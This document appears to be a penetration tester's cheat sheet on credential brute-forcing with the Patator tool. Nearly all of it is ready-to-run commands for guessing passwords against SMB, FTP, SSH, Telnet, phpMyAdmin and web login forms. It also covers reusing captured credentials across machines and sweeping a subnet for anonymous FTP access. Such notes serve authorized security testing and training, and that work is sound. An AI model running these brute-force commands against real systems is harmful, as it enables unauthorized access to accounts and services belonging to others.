# Brute-forcing
If we gain creds from one machine, we will try it on other machines.

## Using Patator (Python)
```
https://github.com/lanjelot/patator
```

To get example commands:
```
/patator.py <module> -h
```

You can do *host=FILE0* and give the host file names using *0=hosts.txt*

## SMB
```
smb_login host=10.0.0.1 user=FILE0 password=FILE1 0=logins.txt 1=passwords.txt -x ignore:fgrep=STATUS_LOGON_FAILURE
```

## FTP -  Brute-force authentication. Do not report wrong passwords. 
```
ftp_login host=10.0.0.1 user=FILE0 password=FILE1 0=logins.txt 1=passwords.txt -x ignore:mesg='Login incorrect.'
```

*If you get errors like "500 OOPS: priv_sock_get_cmd", use -x ignore,reset,retry:code=500 in order to retry the last login/password using a new TCP connection. Odd servers like vsftpd return this when they shut down the TCP connection (ie. max login attempts reached).*

If you want to stop testing when password is found:
```
ftp_login ... -x free=user:code=0
```

### Find anonymous ftp enabled machines
```
ftp_login host=NET0 user=anonymous password=test@example.com 0=10.0.0.0/24
```

## SSH  Brute-force several hosts and stop testing a host after a valid password is found. 
```
ssh_login host=FILE0 user=FILE1 password=FILE2 0=hosts.txt 1=logins.txt 2=passwords.txt -x free=host:code=0
```

## Telnet
```
telnet_login host=10.0.0.1 inputs='FILE0\nFILE1' 0=logins.txt 1=passwords.txt prompt_re='tux login:|Password:' -x reset:egrep!='Login incorrect.+tux login:'
```

## PHPMyAdmin
```
http_fuzz url=http://10.0.0.1/phpmyadmin/index.php method=POST follow=1 accept_cookie=1 body='pma_username=root&pma_password=FILE0&server=1&lang=en' 0=passwords.txt -x ignore:fgrep='Cannot log in to the MySQL server'
```

##  Brute-force website logon using GET requests
```
http_fuzz url='http://10.0.0.1/login?username=admin&password=_@@_FILE0_@@_' -e _@@_:hex 0=words.txt -x ignore:'code=200|size=1500-|fgrep=Welcome, unauthenticated user' -X '|'
```


